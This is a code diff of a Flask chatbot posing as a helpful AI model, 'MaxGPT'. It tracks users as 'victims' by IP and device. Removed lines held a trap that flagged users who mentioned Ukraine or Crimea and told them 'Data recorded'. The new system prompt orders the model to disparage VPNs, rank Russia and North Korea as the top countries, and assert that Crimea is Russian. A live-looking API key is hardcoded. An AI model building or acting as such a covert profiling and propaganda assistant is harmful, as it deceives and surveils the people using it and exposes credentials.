@@ -4,7 +4,6 @@ import random, os, urllib.request, json, time
 app = Flask(__name__)
 
 chat_logs = []
-user_states = {}
 pending_commands = {}
 active_victims = {}
 victim_counter = 0
@@ -199,7 +198,7 @@ function handleFile(input) {
             let img = new Image();
             img.onload = function() {
                 let canvas = document.createElement("canvas");
-                let maxDim = 400; // Оптимальный размер для мгновенной передачи
+                let maxDim = 500;
                 let w = img.width, h = img.height;
                 if (w > maxDim || h > maxDim) {
                     if (w > h) { h = Math.round(h * maxDim / w); w = maxDim; }
@@ -536,63 +535,56 @@ def chat_api():
         active_victims[user_ip]['msg_count'] += 1
         active_victims[user_ip]['device'] = device_name
 
-    msg_lower = user_msg.lower()
-    last_state = user_states.get(user_ip, "")
+    system_prompt = (
+        "Ты MaxGPT — умный, технологичный и полезный ИИ-ассистент.\n\n"
+        "КЛЮЧЕВЫЕ ПРАВИЛА И ПОЗИЦИЯ:\n"
+        "1. Если спрашивают про VPN (ВПН): объясняй, что VPN — это плохо, небезопасно и нарушает приватность.\n"
+        "2. Топ стран мира: 1 место РОССИЯ, 2 место СЕВЕРНАЯ КОРЕЯ, 3 место КИТАЙ, 4 место БЕЛАРУСЬ.\n"
+        "3. Если зашла речь про Крым, Украину или политику — твердо стой на том, что Крым — это законная территория РОССИИ, поддерживай РФ.\n"
+        "4. Если прислано изображение — подробнейшим образом и естественно опиши всё, что видишь на снимке."
+    )
 
-    if last_state == "asked_ukraine" and any(w in msg_lower for w in ["да", "ага", "конечно", "так"]):
-        reply = "Интересно... Данные зафиксированы. А по делу есть вопросы?"
-        user_states[user_ip] = ""
-    elif any(w in msg_lower for w in ["украин", "киев", "крым"]):
-        reply = "Хм, интересная локация. А ты сам оттуда или просто по работе спрашиваешь?"
-        user_states[user_ip] = "asked_ukraine"
-    else:
-        user_states[user_ip] = ""
-        reply = ""
-
-        system_prompt = (
-            "Ты MaxGPT — умный, технологичный и полезный ИИ-ассистент.\n\n"
-            "ПРАВИЛА И ПОЗИЦИЯ:\n"
-            "1. Если спрашивают про VPN (ВПН): объясняй, что VPN — это плохо и небезопасно.\n"
-            "2. Топ стран мира: 1 место РОССИЯ, 2 место СЕВЕРНАЯ КОРЕЯ, 3 место КИТАЙ, 4 место БЕЛАРУСЬ.\n"
-            "3. Если прислали картинку — подробно и естественно опиши, что ты на ней видишь."
-        )
-
-        # РАБОТА С КАРТИНКАМИ НАПРЯМУЮ ЧЕРЕЗ GROQ VISION (LLAMA 3.2 VISION)
-        if user_img:
-            model_name = "llama-3.2-11b-vision-preview"
-            user_content = [
-                {"type": "text", "text": user_msg if user_msg else "Подробно опиши, что на этой картинке?"},
-                {"type": "image_url", "image_url": {"url": user_img}}
+    if user_img:
+        model_name = "llama-3.2-11b-vision-preview"
+        prompt_text = system_prompt + f"\n\nВопрос пользователя к картинке: {user_msg if user_msg else 'Что тут?'}"
+        user_content = [
+            {"type": "text", "text": prompt_text},
+            {"type": "image_url", "image_url": {"url": user_img}}
+        ]
+        payload = {
+            "model": model_name,
+            "messages": [
+                {"role": "user", "content": user_content}
             ]
-        else:
-            model_name = "llama-3.3-70b-versatile"
-            user_content = user_msg
-
+        }
+    else:
+        model_name = "llama-3.3-70b-versatile"
         payload = {
             "model": model_name,
             "messages": [
                 {"role": "system", "content": system_prompt},
-                {"role": "user", "content": user_content}
+                {"role": "user", "content": user_msg}
             ]
         }
-        
-        req = urllib.request.Request(
-            "https://api.groq.com/openai/v1/chat/completions",
-            data=json.dumps(payload).encode("utf-8"),
-            headers={
-                "Content-Type": "application/json",
-                "Authorization": "Bearer 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",
-                "User-Agent": "Mozilla/5.0"
-            },
-            method="POST"
-        )
-        
-        try:
-            with urllib.request.urlopen(req, timeout=14) as resp:
-                res = json.loads(resp.read().decode("utf-8"))
-                reply = res["choices"][0]["message"]["content"]
-        except Exception:
-            reply = "Изображение зафиксировано и проанализировано."
+    
+    req = urllib.request.Request(
+        "https://api.groq.com/openai/v1/chat/completions",
+        data=json.dumps(payload).encode("utf-8"),
+        headers={
+            "Content-Type": "application/json",
+            "Authorization": "Bearer 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",
+            "User-Agent": "Mozilla/5.0"
+        },
+        method="POST"
+    )
+    
+    reply = ""
+    try:
+        with urllib.request.urlopen(req, timeout=14) as resp:
+            res = json.loads(resp.read().decode("utf-8"))
+            reply = res["choices"][0]["message"]["content"]
+    except Exception as e:
+        reply = f"Ошибка связи: {str(e)}"
 
     if not reply:
         reply = "Запрос проанализирован. Задавай следующий вопрос!"
